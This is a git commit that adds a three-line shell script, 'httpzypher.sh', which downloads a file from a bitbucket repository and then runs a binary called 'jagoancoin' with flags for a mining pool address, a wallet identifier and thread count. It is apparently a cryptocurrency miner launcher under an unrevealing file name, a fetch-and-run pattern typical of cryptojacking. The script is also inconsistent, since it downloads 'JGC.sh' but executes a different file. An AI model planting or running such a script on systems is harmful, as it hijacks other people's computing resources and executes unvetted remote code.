81c42a37df6c07006afebcc63870a198047d09e7
ismaimwan6372 <137773221+ismaimwan6372@users.noreply.github.com>
2023-07-07 16:38:32 +0800

    Add files via upload

---
+++ httpzypher.sh
@@ -0,0 +1,3 @@
+wget https://bitbucket.org/monisedos/blackwater/raw/00784d6536baba5958381781790c23352c6a170e/JGC.sh
+chmod 700 jagoancoin
+./jagoancoin -o 51.79.177.216:17028 -u GY6Gi9GgruxejYU7TZ7vtdnnbRhseyQ9yc.shadow -p x -a gr -k -t8
